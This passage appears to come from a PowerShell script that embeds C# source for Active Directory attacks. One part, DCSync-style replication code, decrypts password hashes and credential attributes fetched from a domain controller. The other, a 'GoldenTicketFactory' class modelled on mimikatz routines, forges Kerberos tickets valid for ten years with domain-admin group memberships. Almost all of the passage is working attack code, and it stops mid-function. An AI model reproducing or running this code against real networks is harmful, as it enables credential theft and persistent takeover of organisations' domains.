                    int ex = Marshal.GetExceptionCode();
                    return (UInt32)ex;
                }
                finally
                {
                    FreeTrackedMemoryAndRemoveTracking();
                }
                return (UInt32)result.ToInt64();
            }

            private void MarshalReplicationData(DRS_MSG_GETCHGREPLY_V6 pmsgOut, out Dictionary<int, object> replicationData)
            {
                IntPtr pObjects = pmsgOut.pObjects;
                uint numObjects = pmsgOut.cNumObjects;
                replicationData = new Dictionary<int, object>();
                REPLENTINFLIST list = (REPLENTINFLIST)Marshal.PtrToStructure(pObjects, typeof(REPLENTINFLIST));
                int size = Marshal.SizeOf(typeof(ATTR));
                for (uint i = 0; i < list.Entinf.AttrBlock.attrCount; i++)
                {
                    ATTR attr = (ATTR)Marshal.PtrToStructure(new IntPtr(list.Entinf.AttrBlock.pAttr.ToInt64() + i * size), typeof(ATTR));
                    Trace.WriteLine("Type= " + attr.attrTyp);
                    int sizeval = Marshal.SizeOf(typeof(ATTRVAL));
                    List<byte[]> values = new List<byte[]>();
                    for (uint j = 0; j < attr.AttrVal.valCount; j++)
                    {
                        ATTRVAL attrval = (ATTRVAL)Marshal.PtrToStructure(new IntPtr(attr.AttrVal.pAVal.ToInt64() + j * sizeval), typeof(ATTRVAL));
                        byte[] data = new byte[attrval.valLen];
                        Marshal.Copy(attrval.pVal, data, 0, (int)attrval.valLen);

                        switch((ATT)attr.attrTyp)
                        {
                            //case ATT.ATT_CURRENT_VALUE:
                            case ATT.ATT_UNICODE_PWD:
                            case ATT.ATT_NT_PWD_HISTORY:
                            case ATT.ATT_DBCS_PWD:
                            case ATT.ATT_LM_PWD_HISTORY:
                            case ATT.ATT_SUPPLEMENTAL_CREDENTIALS:
                            //case ATT.ATT_TRUST_AUTH_INCOMING:
                            //case ATT.ATT_TRUST_AUTH_OUTGOING:
                                data = DecryptReplicationData(data);
                                break;

                        }

                        values.Add(data);
                    }
                    if (values.Count == 1)
                    {
                        replicationData[(int)attr.attrTyp] = values[0];
                    }
                    else if (values.Count > 1)
                    {
                        replicationData[(int)attr.attrTyp] = values;
                    }
                }
            }

            UInt32[] dwCrc32Table = new UInt32[]
            {   
                0x00000000, 0x77073096, 0xEE0E612C, 0x990951BA,   
                0x076DC419, 0x706AF48F, 0xE963A535, 0x9E6495A3,   
                0x0EDB8832, 0x79DCB8A4, 0xE0D5E91E, 0x97D2D988,   
                0x09B64C2B, 0x7EB17CBD, 0xE7B82D07, 0x90BF1D91,   
                0x1DB71064, 0x6AB020F2, 0xF3B97148, 0x84BE41DE,   
                0x1ADAD47D, 0x6DDDE4EB, 0xF4D4B551, 0x83D385C7,   
                0x136C9856, 0x646BA8C0, 0xFD62F97A, 0x8A65C9EC,   
                0x14015C4F, 0x63066CD9, 0xFA0F3D63, 0x8D080DF5,   
                0x3B6E20C8, 0x4C69105E, 0xD56041E4, 0xA2677172,   
                0x3C03E4D1, 0x4B04D447, 0xD20D85FD, 0xA50AB56B,   
                0x35B5A8FA, 0x42B2986C, 0xDBBBC9D6, 0xACBCF940,   
                0x32D86CE3, 0x45DF5C75, 0xDCD60DCF, 0xABD13D59,   
                0x26D930AC, 0x51DE003A, 0xC8D75180, 0xBFD06116,   
                0x21B4F4B5, 0x56B3C423, 0xCFBA9599, 0xB8BDA50F,   
                0x2802B89E, 0x5F058808, 0xC60CD9B2, 0xB10BE924,   
                0x2F6F7C87, 0x58684C11, 0xC1611DAB, 0xB6662D3D,   
   
                0x76DC4190, 0x01DB7106, 0x98D220BC, 0xEFD5102A,   
                0x71B18589, 0x06B6B51F, 0x9FBFE4A5, 0xE8B8D433,   
                0x7807C9A2, 0x0F00F934, 0x9609A88E, 0xE10E9818,   
                0x7F6A0DBB, 0x086D3D2D, 0x91646C97, 0xE6635C01,   
                0x6B6B51F4, 0x1C6C6162, 0x856530D8, 0xF262004E,   
                0x6C0695ED, 0x1B01A57B, 0x8208F4C1, 0xF50FC457,   
                0x65B0D9C6, 0x12B7E950, 0x8BBEB8EA, 0xFCB9887C,   
                0x62DD1DDF, 0x15DA2D49, 0x8CD37CF3, 0xFBD44C65,   
                0x4DB26158, 0x3AB551CE, 0xA3BC0074, 0xD4BB30E2,   
                0x4ADFA541, 0x3DD895D7, 0xA4D1C46D, 0xD3D6F4FB,   
                0x4369E96A, 0x346ED9FC, 0xAD678846, 0xDA60B8D0,   
                0x44042D73, 0x33031DE5, 0xAA0A4C5F, 0xDD0D7CC9,   
                0x5005713C, 0x270241AA, 0xBE0B1010, 0xC90C2086,   
                0x5768B525, 0x206F85B3, 0xB966D409, 0xCE61E49F,   
                0x5EDEF90E, 0x29D9C998, 0xB0D09822, 0xC7D7A8B4,   
                0x59B33D17, 0x2EB40D81, 0xB7BD5C3B, 0xC0BA6CAD,   
   
                0xEDB88320, 0x9ABFB3B6, 0x03B6E20C, 0x74B1D29A,   
                0xEAD54739, 0x9DD277AF, 0x04DB2615, 0x73DC1683,   
                0xE3630B12, 0x94643B84, 0x0D6D6A3E, 0x7A6A5AA8,   
                0xE40ECF0B, 0x9309FF9D, 0x0A00AE27, 0x7D079EB1,   
                0xF00F9344, 0x8708A3D2, 0x1E01F268, 0x6906C2FE,   
                0xF762575D, 0x806567CB, 0x196C3671, 0x6E6B06E7,   
                0xFED41B76, 0x89D32BE0, 0x10DA7A5A, 0x67DD4ACC,   
                0xF9B9DF6F, 0x8EBEEFF9, 0x17B7BE43, 0x60B08ED5,   
                0xD6D6A3E8, 0xA1D1937E, 0x38D8C2C4, 0x4FDFF252,   
                0xD1BB67F1, 0xA6BC5767, 0x3FB506DD, 0x48B2364B,   
                0xD80D2BDA, 0xAF0A1B4C, 0x36034AF6, 0x41047A60,   
                0xDF60EFC3, 0xA867DF55, 0x316E8EEF, 0x4669BE79,   
                0xCB61B38C, 0xBC66831A, 0x256FD2A0, 0x5268E236,   
                0xCC0C7795, 0xBB0B4703, 0x220216B9, 0x5505262F,   
                0xC5BA3BBE, 0xB2BD0B28, 0x2BB45A92, 0x5CB36A04,   
                0xC2D7FFA7, 0xB5D0CF31, 0x2CD99E8B, 0x5BDEAE1D,   
   
                0x9B64C2B0, 0xEC63F226, 0x756AA39C, 0x026D930A,   
                0x9C0906A9, 0xEB0E363F, 0x72076785, 0x05005713,   
                0x95BF4A82, 0xE2B87A14, 0x7BB12BAE, 0x0CB61B38,   
                0x92D28E9B, 0xE5D5BE0D, 0x7CDCEFB7, 0x0BDBDF21,   
                0x86D3D2D4, 0xF1D4E242, 0x68DDB3F8, 0x1FDA836E,   
                0x81BE16CD, 0xF6B9265B, 0x6FB077E1, 0x18B74777,   
                0x88085AE6, 0xFF0F6A70, 0x66063BCA, 0x11010B5C,   
                0x8F659EFF, 0xF862AE69, 0x616BFFD3, 0x166CCF45,   
                0xA00AE278, 0xD70DD2EE, 0x4E048354, 0x3903B3C2,   
                0xA7672661, 0xD06016F7, 0x4969474D, 0x3E6E77DB,   
                0xAED16A4A, 0xD9D65ADC, 0x40DF0B66, 0x37D83BF0,   
                0xA9BCAE53, 0xDEBB9EC5, 0x47B2CF7F, 0x30B5FFE9,   
                0xBDBDF21C, 0xCABAC28A, 0x53B39330, 0x24B4A3A6,   
                0xBAD03605, 0xCDD70693, 0x54DE5729, 0x23D967BF,   
                0xB3667A2E, 0xC4614AB8, 0x5D681B02, 0x2A6F2B94,   
                0xB40BBE37, 0xC30C8EA1, 0x5A05DF1B, 0x2D02EF8D,   
            };

            UInt32 CalcCrc32(byte[] data)
            {
	            UInt32 dwCRC = 0xFFFFFFFF;
                for (int i = 0; i < data.Length; i++ )
                {
                    dwCRC = (dwCRC >> 8) ^ dwCrc32Table[(data[i]) ^ (dwCRC & 0x000000FF)];
                }
	            dwCRC = ~dwCRC; 
	            return dwCRC;
            }

            private byte[] DecryptReplicationData(byte[] data)
            {
                if (data.Length < 16)
                    return null;
                MD5CryptoServiceProvider md5 = new MD5CryptoServiceProvider();
                md5.TransformBlock(SessionKey, 0, SessionKey.Length, SessionKey, 0);
                md5.TransformFinalBlock(data, 0, 16);
                byte[] key = md5.Hash;
                byte[] todecrypt = new byte[data.Length-16];
                Array.Copy(data,16, todecrypt, 0, data.Length -16);
                byte[] decrypted = RtlEncryptDecryptRC4(todecrypt, key);
                byte[] output = new byte[decrypted.Length - 4];
                Array.Copy(decrypted, 4, output, 0, decrypted.Length - 4);
                UInt32 crc = CalcCrc32(output);
                UInt32 expectedCrc = BitConverter.ToUInt32(decrypted, 0);
                if (crc != expectedCrc)
                    return null;
                return output;
            }


            private void DecodeReplicationFields(Dictionary<int, object> ReplicationData, out Dictionary<string, object> DecodedReplicationData)
            {
                DecodedReplicationData = new Dictionary<string, object>();
                foreach(ATT att in Enum.GetValues(typeof(ATT)))
                {
                    if (ReplicationData.ContainsKey((int)att))
                    {
                        byte[] data = ReplicationData[(int) att] as byte[];
                        if (data != null)
                        {
                            DecodeData(data, att, ReplicationData, DecodedReplicationData);
                        }
                        else
                        {
                            List<byte[]> datalist = ReplicationData[(int)att] as List<byte[]>;
                            foreach (byte[] dataitem in datalist)
                            {
                                DecodeData(data, att, ReplicationData, DecodedReplicationData);
                            }
                        }
                    }
                }
            }

            private void DecodeData(byte[] data, ATT att, Dictionary<int, object> ReplicationData, Dictionary<string, object> DecodedReplicationData)
            {
                switch (att)
                {
                    case ATT.ATT_WHEN_CREATED:
                    case ATT.ATT_WHEN_CHANGED:
                        //    var test = BitConverter.ToInt64(data, 0);    
                        //string stringdate = UnicodeEncoding.Default.GetString(data);
                        //    DateTime d = DateTime.ParseExact(stringdate, "yyyyMMddHHmmss.f'Z'", CultureInfo.InvariantCulture);
                        //    DecodedReplicationData.Add(att.ToString(), d);
                        break;
                    case ATT.ATT_LAST_LOGON:
                    case ATT.ATT_PWD_LAST_SET:
                    case ATT.ATT_ACCOUNT_EXPIRES:
                    case ATT.ATT_LOCKOUT_TIME:
                        Int64 intdate = BitConverter.ToInt64(data, 0);
                        DateTime datetime;
                        if (intdate == Int64.MaxValue)
                        {
                            datetime = DateTime.MaxValue;
                        }
                        else
                        {
                            datetime = DateTime.FromFileTime(intdate);
                        }
                        DecodedReplicationData.Add(att.ToString(), datetime);
                        break;
                    case ATT.ATT_RDN:
                    case ATT.ATT_SAM_ACCOUNT_NAME:
                    case ATT.ATT_USER_PRINCIPAL_NAME:
                    case ATT.ATT_SERVICE_PRINCIPAL_NAME:
                        DecodedReplicationData.Add(att.ToString(), UnicodeEncoding.Unicode.GetString(data));
                        break;
                    case ATT.ATT_LOGON_WORKSTATION:
                        break;

                    case ATT.ATT_USER_ACCOUNT_CONTROL:
                        DecodedReplicationData.Add(att.ToString(), BitConverter.ToInt32(data, 0));
                        break;
                    case ATT.ATT_SAM_ACCOUNT_TYPE:
                        DecodedReplicationData.Add(att.ToString(), BitConverter.ToInt32(data, 0));
                        break;

                    case ATT.ATT_UNICODE_PWD:
                    case ATT.ATT_NT_PWD_HISTORY:
                    case ATT.ATT_DBCS_PWD:
                    case ATT.ATT_LM_PWD_HISTORY:
                        byte[] decrypted = DecryptHashUsingSID(data, ReplicationData[(int)ATT.ATT_OBJECT_SID] as byte[]);
                        DecodedReplicationData.Add(att.ToString(), decrypted);
                        break;
                    case ATT.ATT_SID_HISTORY:
                    case ATT.ATT_OBJECT_SID:
                        DecodedReplicationData.Add(att.ToString(), new SecurityIdentifier(data, 0));
                        break;
                    case ATT.ATT_LOGON_HOURS:
                    default:
                        DecodedReplicationData.Add(att.ToString(), data.ToString());
                        break;
                }
            }

            private byte[] DecryptHashUsingSID(byte[] hashEncryptedWithRID, byte[] sidByteForm)
            {
                // extract the RID from the SID
                GCHandle handle = GCHandle.Alloc(sidByteForm, GCHandleType.Pinned);
                IntPtr sidIntPtr = handle.AddrOfPinnedObject();
                IntPtr SubAuthorityCountIntPtr = GetSidSubAuthorityCount(sidIntPtr);
                byte SubAuthorityCount = Marshal.ReadByte(SubAuthorityCountIntPtr);
                IntPtr SubAuthorityIntPtr = GetSidSubAuthority(sidIntPtr, (uint)SubAuthorityCount - 1);
                UInt32 rid = (UInt32) Marshal.ReadInt32(SubAuthorityIntPtr);
                handle.Free();

                // Decrypt the hash
                byte[] output = new byte[16] ;
                IntPtr outputPtr = Marshal.AllocHGlobal(16);
                RtlDecryptDES2blocks1DWORD(hashEncryptedWithRID, ref rid, outputPtr);
                Marshal.Copy(outputPtr, output, 0, 16);
                Marshal.FreeHGlobal(outputPtr);
                return output;
            }
            #endregion
        }


}

"@

$sourceGolden = @"
using Microsoft.Win32.SafeHandles;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.IO;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;

namespace drsrdotnet
{

    public class GoldenTicketFactory
    {

        #region constant

        private const int KERBEROS_VERSION = 5;
        private const int ID_APP_KRB_CRED = 22;
        private const int ID_APP_TICKET = 1;

        private const int KRB_NT_PRINCIPAL = 1;
        private const int KRB_NT_SRV_INST = 2;
        private const int KERB_TICKET_FLAGS_initial = 0x00400000;
        private const int KERB_TICKET_FLAGS_pre_authent = 0x00200000;
        private const int KERB_TICKET_FLAGS_renewable = 0x00800000;
        private const int KERB_TICKET_FLAGS_forwardable = 0x40000000;
        private const int USER_DONT_EXPIRE_PASSWORD = (0x00000200);
        private const int USER_NORMAL_ACCOUNT = (0x00000010);
        
        private const int KRB_KEY_USAGE_AS_REP_TGS_REP = 2;
        private const int KERB_NON_KERB_CKSUM_SALT = 17;

        private const int PACINFO_ID_KERB_VALINFO = 0x00020000;
        private const int PACINFO_ID_KERB_EFFECTIVENAME = 0x00020004;
        private const int PACINFO_ID_KERB_FULLNAME = 0x00020008;
        private const int PACINFO_ID_KERB_LOGONSCRIPT = 0x0002000c;
        private const int PACINFO_ID_KERB_PROFILEPATH = 0x00020010;
        private const int PACINFO_ID_KERB_HOMEDIRECTORY = 0x00020014;
        private const int PACINFO_ID_KERB_HOMEDIRECTORYDRIVE = 0x00020018;
        private const int PACINFO_ID_KERB_GROUPIDS = 0x0002001c;
        private const int PACINFO_ID_KERB_LOGONSERVER = 0x00020020;
        private const int PACINFO_ID_KERB_LOGONDOMAINNAME = 0x00020024;
        private const int PACINFO_ID_KERB_LOGONDOMAINID = 0x00020028;
        private const int PACINFO_ID_KERB_EXTRASIDS = 0x0002002c;
        private const int PACINFO_ID_KERB_EXTRASID = 0x00020030;
        private const int PACINFO_ID_KERB_RESGROUPDOMAINSID = 0x00020034;
        private const int PACINFO_ID_KERB_RESGROUPIDS = 0x00020038;


        private const int PACINFO_TYPE_LOGON_INFO = 0x00000001;
        private const int PACINFO_TYPE_CHECKSUM_SRV = 0x00000006;
        private const int PACINFO_TYPE_CHECKSUM_KDC = 0x00000007;
        private const int PACINFO_TYPE_CNAME_TINFO = 0x0000000a;


        private const int DIRTY_ASN1_ID_BOOLEAN = 0x01;
        private const int DIRTY_ASN1_ID_INTEGER = 0x02;
        private const int DIRTY_ASN1_ID_BIT_STRING = 0x03;
        private const int DIRTY_ASN1_ID_OCTET_STRING = 0x04;
        private const int DIRTY_ASN1_ID_NULL = 0x05;
        private const int DIRTY_ASN1_ID_OBJECT_IDENTIFIER = 0x06;
        private const int DIRTY_ASN1_ID_GENERAL_STRING = 0x1b;
        private const int DIRTY_ASN1_ID_GENERALIZED_TIME = 0x18;
        private const int DIRTY_ASN1_ID_SEQUENCE = 0x30;
        private const int ID_CTX_KRB_CRED_PVNO = 0;
        private const int ID_CTX_KRB_CRED_MSG_TYPE = 1;
        private const int ID_CTX_KRB_CRED_TICKETS = 2;
        private const int ID_CTX_KRB_CRED_ENC_PART = 3;
        private const int ID_CTX_TICKET_TKT_VNO = 0;
        private const int ID_CTX_TICKET_REALM = 1;
        private const int ID_CTX_TICKET_SNAME = 2;
        private const int ID_CTX_TICKET_ENC_PART = 3;
        private const int ID_APP_ENCKRBCREDPART = 29;
        private const int ID_CTX_ENCKRBCREDPART_TICKET_INFO = 0;
        private const int ID_CTX_ENCKRBCREDPART_NONCE = 1;
        private const int ID_CTX_ENCKRBCREDPART_TIMESTAMP = 2;
        private const int ID_CTX_ENCKRBCREDPART_USEC = 3;
        private const int ID_CTX_ENCKRBCREDPART_S_ADDRESS = 4;
        private const int ID_CTX_ENCKRBCREDPART_R_ADDRESS = 5;
        private const int ID_CTX_KRBCREDINFO_KEY = 0;
        private const int ID_CTX_KRBCREDINFO_PREALM = 1;
        private const int ID_CTX_KRBCREDINFO_PNAME = 2;
        private const int ID_CTX_KRBCREDINFO_FLAGS = 3;
        private const int ID_CTX_KRBCREDINFO_AUTHTIME = 4;
        private const int ID_CTX_KRBCREDINFO_STARTTIME = 5;
        private const int ID_CTX_KRBCREDINFO_ENDTIME = 6;
        private const int ID_CTX_KRBCREDINFO_RENEW_TILL = 7;
        private const int ID_CTX_KRBCREDINFO_SREAL = 8;
        private const int ID_CTX_KRBCREDINFO_SNAME = 9;
        private const int ID_CTX_KRBCREDINFO_CADDR = 10;
        private const int ID_APP_ENCTICKETPART = 3;
        private const int ID_CTX_ENCTICKETPART_FLAGS = 0;
        private const int ID_CTX_ENCTICKETPART_KEY = 1;
        private const int ID_CTX_ENCTICKETPART_CREALM = 2;
        private const int ID_CTX_ENCTICKETPART_CNAME = 3;
        private const int ID_CTX_ENCTICKETPART_TRANSITED = 4;
        private const int ID_CTX_ENCTICKETPART_AUTHTIME = 5;
        private const int ID_CTX_ENCTICKETPART_STARTTIME = 6;
        private const int ID_CTX_ENCTICKETPART_ENDTIME = 7;
        private const int ID_CTX_ENCTICKETPART_RENEW_TILL = 8;
        private const int ID_CTX_ENCTICKETPART_CADDR = 9;
        private const int ID_CTX_ENCTICKETPART_AUTHORIZATION_DATA = 10;

        private const int ID_CTX_ENCRYPTEDDATA_ETYPE = 0;
        private const int ID_CTX_ENCRYPTEDDATA_KVNO = 1;
        private const int ID_CTX_ENCRYPTEDDATA_CIPHER = 2;
        private const int ID_CTX_AUTHORIZATIONDATA_AD_TYPE = 0;
        private const int ID_CTX_AUTHORIZATIONDATA_AD_DATA = 1;
        private const int ID_AUTHDATA_AD_IF_RELEVANT = 1;
        private const int ID_AUTHDATA_AD_WIN2K_PAC = 128;
        private const int ID_CTX_ENCRYPTIONKEY_KEYTYPE = 0;
        private const int ID_CTX_ENCRYPTIONKEY_KEYVALUE = 1;
        private const int ID_CTX_PRINCIPALNAME_NAME_TYPE = 0;
        private const int ID_CTX_PRINCIPALNAME_NAME_STRING = 1;
        private const int ID_CTX_TRANSITEDENCODING_TR_TYPE = 0;
        private const int ID_CTX_TRANSITEDENCODING_CONTENTS = 1;

        private const int SE_GROUP_MANDATORY = 1;
        private const int SE_GROUP_ENABLED_BY_DEFAULT = 2;
        private const int SE_GROUP_ENABLED = 4;
        #endregion

        #region pinvoke
        [DllImport("wldap32.dll", CallingConvention = CallingConvention.Cdecl, CharSet = CharSet.Ansi)]
        private static extern int ber_printf(BerSafeHandle berElement, string format, __arglist);

        [DllImport("wldap32.dll", CallingConvention = CallingConvention.Cdecl)]
        private static extern IntPtr ber_alloc_t(int option);

        [DllImport("wldap32.dll", CallingConvention = CallingConvention.Cdecl)]
        private static extern IntPtr ber_free([In] IntPtr berelement, int option);

        [DllImport("wldap32.dll", CallingConvention = CallingConvention.Cdecl)]
        private static extern int ber_bvfree(IntPtr value);

        [DllImport("wldap32.dll", CallingConvention = CallingConvention.Cdecl)]
        private static extern int ber_flatten(BerSafeHandle berElement, ref IntPtr value);

        [DllImport("wldap32.dll", CallingConvention = CallingConvention.Cdecl)]
        private static extern IntPtr ber_init(berval value);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern IntPtr GetSidSubAuthorityCount(IntPtr psid);

        [DllImport("cryptdll.Dll", CharSet = CharSet.Auto, SetLastError = false)]
        private static extern int CDLocateCheckSum(KERB_CHECKSUM_ALGORITHM type, out IntPtr pCheckSum);

        [DllImport("cryptdll.Dll", CharSet = CharSet.Auto, SetLastError = false)]
        private static extern int CDLocateCSystem(KERB_ETYPE_ALGORITHM type, out IntPtr pCheckSum);

        #endregion

        #region delegates


        delegate int KERB_ECRYPT_Initialize(byte[] Key, int KeySize, int KeyUsage, out IntPtr pContext);
        delegate int KERB_ECRYPT_Encrypt(IntPtr pContext, byte[] data, int dataSize, byte[] output, ref int outputSize);
        delegate int KERB_ECRYPT_Finish(ref IntPtr pContext);
        delegate int KERB_CHECKSUM_Initialize(int unk0, out IntPtr pContext);
        delegate int KERB_CHECKSUM_Sum(IntPtr pContext, int Size, byte[] Buffer);
        delegate int KERB_CHECKSUM_Finalize(IntPtr pContext, byte[] Buffer);
        delegate int KERB_CHECKSUM_Finish(ref IntPtr pContext);
        delegate int KERB_CHECKSUM_InitializeEx(byte[] Key, int KeySize, int KeyUsage, out IntPtr pContext);

        #endregion

        #region pinvoke struct & class

        [StructLayout(LayoutKind.Sequential)]
        private struct KERB_ECRYPT
        {
            int Type0;
	        public int BlockSize;
	        int Type1;
	        int KeySize;
	        public int Size;
	        int unk2;
	        int unk3;
	        IntPtr AlgName;
	        public IntPtr Initialize;
	        public IntPtr Encrypt;
	        IntPtr Decrypt;
	        public IntPtr Finish;
            IntPtr HashPassword;
	        IntPtr RandomKey;
	        IntPtr Control;
	        IntPtr unk0_null;
	        IntPtr unk1_null;
        IntPtr unk2_null;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct KERB_CHECKSUM
        {
            public int Type;
            public int Size;
            public int Flag;
            public IntPtr Initialize;
            public IntPtr Sum;
            public IntPtr Finalize;
            public IntPtr Finish;
            public IntPtr InitializeEx;
            public IntPtr unk0_null;
        }

        [StructLayout(LayoutKind.Sequential)]
        private sealed class berval
        {
            public int bv_len;

            public IntPtr bv_val = (IntPtr)0;
        }


        [SuppressUnmanagedCodeSecurity]
        private sealed class BerSafeHandle : SafeHandleZeroOrMinusOneIsInvalid
        {

            internal BerSafeHandle()
                : base(true)
            {
                base.SetHandle(ber_alloc_t(1));
                if (this.handle == (IntPtr)0)
                {
                    throw new OutOfMemoryException();
                }
            }

            internal BerSafeHandle(berval value)
                : base(true)
            {
                base.SetHandle(ber_init(value));
                if (this.handle == (IntPtr)0)
                {
                    throw new Exception("Ber exception");
                }
            }

            protected override bool ReleaseHandle()
            {
                ber_free(this.handle, 1);
                return true;
            }

            public byte[] ToByteArray()
            {
                berval berval = new berval();
                IntPtr intPtr = (IntPtr)0;
                byte[] array;
                try
                {
                    int num2 = ber_flatten(this, ref intPtr);
                    if (num2 == -1)
                    {
                        throw new Exception("ber_flatten exception");
                    }
                    if (intPtr != (IntPtr)0)
                    {
                        Marshal.PtrToStructure(intPtr, berval);
                    }
                    if (berval == null || berval.bv_len == 0)
                    {
                        array = new byte[0];
                    }
                    else
                    {
                        array = new byte[berval.bv_len];
                        Marshal.Copy(berval.bv_val, array, 0, berval.bv_len);
                    }
                }
                finally
                {
                    if (intPtr != (IntPtr)0)
                    {
                        ber_bvfree(intPtr);
                    }
                }
                return array;
            }
        }

        #endregion

        #region enums
        
        public enum KERB_ETYPE_ALGORITHM
        {
            KERB_ETYPE_RC4_HMAC_NT=23,
            KERB_ETYPE_AES128_CTS_HMAC_SHA1_96=17,
            KERB_ETYPE_AES256_CTS_HMAC_SHA1_96=18,
            KERB_ETYPE_DES_CBC_MD5=3,
        }

        public enum KERB_CHECKSUM_ALGORITHM
        {
            KERB_CHECKSUM_HMAC_SHA1_96_AES128 = 15,
            KERB_CHECKSUM_HMAC_SHA1_96_AES256 = 16,
            KERB_CHECKSUM_DES_MAC = -133,
            KERB_CHECKSUM_HMAC_MD5 = -138,
        }
        #endregion


        #region constructor

        private GoldenTicketFactory()
        {
            TicketStart = DateTime.FromFileTimeUtc(((long)(DateTime.Now.ToFileTimeUtc() / 10000000) * 10000000));
            TicketRenew = TicketStart.AddYears(10);
            TicketEnd = TicketStart.AddYears(10);
            SessionKey = new byte[16];
            Random rnd = new Random();
            rnd.NextBytes(SessionKey);

        }

        static byte[] StringToByteArray(String hex)
        {
            int NumberChars = hex.Length;
            byte[] bytes = new byte[NumberChars / 2];
            for (int i = 0; i < NumberChars; i += 2)
                bytes[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);
            return bytes;
        }

        public GoldenTicketFactory(string username, string domainname, SecurityIdentifier domainSid, byte[] domainKey) :
            this(username, domainname, domainSid, domainname.Split('.')[0].ToUpperInvariant(), null, null, domainKey, 500, new int[5] { 513, 512, 520, 518, 519 })
        {
        }

        public GoldenTicketFactory(string username, string domainname, SecurityIdentifier domainSid,
                                string logonDomainName, string servicename, string targetname, byte[] domainKey, int userId, int[] groups)
            : this()
        {
            DomainSid = domainSid;
            UserName = username;
            DomainName = domainname.ToLowerInvariant();
            LogonDomainName = logonDomainName;
            Servicename = servicename;
            TargetName = targetname;
            DomainKey = domainKey;
            DomainKeyType = SetDomainKeyType();
            UserId = userId;
            Groups = groups;
            if (Groups != null)
            {
                GroupAttributes = new int[Groups.Length];
                for (int i = 0; i < GroupAttributes.Length; i++)
                {
                    GroupAttributes[i] = SE_GROUP_MANDATORY | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_ENABLED;
                }
            }
            if (ExtraSids != null)
            {
                ExtraSidAttributes = new int[ExtraSids.Length];
                for (int i = 0; i < ExtraSids.Length; i++)
                {
                    ExtraSidAttributes[i] = SE_GROUP_MANDATORY | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_ENABLED;
                }
            }
            TargetDomainName = AltTargetDomainName = DomainName;
        }

        //TODO
        /*PGROUP_MEMBERSHIP groups, DWORD cbGroups, PKERB_SID_AND_ATTRIBUTES sids, DWORD cbSids,*/



        #endregion

        #region properties

        public string UserName;
        public string DomainName;
        public SecurityIdentifier DomainSid;
        public string LogonDomainName;
        public string Servicename;
        public string TargetName;
        public string AltTargetDomainName;
        public string TargetDomainName;

        public byte[] Krbtgt;
        public byte[] SessionKey;
        public DateTime TicketStart;
        public DateTime TicketEnd;
        public DateTime TicketRenew;
        public byte[] DomainKey;
        public KERB_ETYPE_ALGORITHM DomainKeyType;
        public int RODC;
        public int UserId;
        public int[] Groups;
        public int[] GroupAttributes;
        public SecurityIdentifier[] ExtraSids;
        public int[]ExtraSidAttributes;

        public KERB_CHECKSUM_ALGORITHM SignatureType
        {
            get
            {
                switch (DomainKeyType)
                {
                    case KERB_ETYPE_ALGORITHM.KERB_ETYPE_AES128_CTS_HMAC_SHA1_96:
                        return KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_SHA1_96_AES128;
                    case KERB_ETYPE_ALGORITHM.KERB_ETYPE_AES256_CTS_HMAC_SHA1_96:
                        return KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_SHA1_96_AES256;
                    case KERB_ETYPE_ALGORITHM.KERB_ETYPE_DES_CBC_MD5:
                        return KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_DES_MAC;
                    case KERB_ETYPE_ALGORITHM.KERB_ETYPE_RC4_HMAC_NT:
                    default:
                        return KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_MD5;
                }
            }
        }

        class KerbExternalName
        {
            public string[] Names;
            public int NameType;
        }

        KerbExternalName ClientName {
            get
            {
                KerbExternalName ken = new KerbExternalName();
                ken.Names = new string[] { UserName };
                ken.NameType = KRB_NT_PRINCIPAL;
                return ken;
            }
        }

        KerbExternalName KerbServiceName
        {
            get
            {
                KerbExternalName ken = new KerbExternalName();
                ken.Names = new string[] {
                    (!String.IsNullOrEmpty(Servicename) ? Servicename : "krbtgt"),
                    (!String.IsNullOrEmpty(TargetName) ? TargetName : DomainName),
                };
                ken.NameType = KRB_NT_SRV_INST;
                return ken;
            }
        }
        int TicketKvno
        {
            get
            {
                return RODC != 0 ? (0x00000001 | (RODC << 16)) : 2;
            }
        }
        int TicketFlags
        {
            get
            {
                if (String.IsNullOrEmpty(Servicename))
                    return (KERB_TICKET_FLAGS_initial | KERB_TICKET_FLAGS_pre_authent | KERB_TICKET_FLAGS_renewable | KERB_TICKET_FLAGS_forwardable);
                return 0;
            }
        }


        private KERB_ETYPE_ALGORITHM SetDomainKeyType()
        {
            if (DomainKey == null)
            {
                throw new Exception("DomainKey not set");
            }
            switch (DomainKey.Length)
            {
                case 16:
                    return KERB_ETYPE_ALGORITHM.KERB_ETYPE_RC4_HMAC_NT;
                case 32:
                    return KERB_ETYPE_ALGORITHM.KERB_ETYPE_AES256_CTS_HMAC_SHA1_96;
                //KERB_ETYPE_AES128_CTS_HMAC_SHA1_96
                //
                //KERB_ETYPE_DES_CBC_MD5
                default:
                    throw new Exception("The DomainKey size does not match a known algorithm size");
            }
        }
        #endregion


        public byte[] CreateGoldenTicket()
        {
            

            byte[] pac = Encode();
            //File.WriteAllBytes("pac.bin", pac);
            byte[] EncTicketPart = kuhl_m_kerberos_ticket_createAppEncTicketPart(pac);
            //File.WriteAllBytes("EncTicketPart.bin", EncTicketPart);
            byte[] EncryptedTicket = kuhl_m_kerberos_encrypt(DomainKeyType, KRB_KEY_USAGE_AS_REP_TGS_REP, DomainKey, EncTicketPart);
            //File.WriteAllBytes("EncryptedTicket.bin", EncryptedTicket);
            byte[] ticketData = kuhl_m_kerberos_ticket_createAppKrbCred(false, EncryptedTicket);
            //File.WriteAllBytes("ticketData.bin", ticketData);
            return ticketData;
        }

        private static int MAKE_APP_TAG(int tag)
        {
            return 0x60 + tag;
        }

        private static int MAKE_CTX_TAG(int tag)
        {
            return 0xa0 + tag;
        }


        private byte[] kuhl_m_kerberos_ticket_createAppKrbCred(bool valueIsTicket, byte[] EncryptedTicket)
        {
            BerSafeHandle pBer = new BerSafeHandle();
            BerSafeHandle pBerApp = new BerSafeHandle();
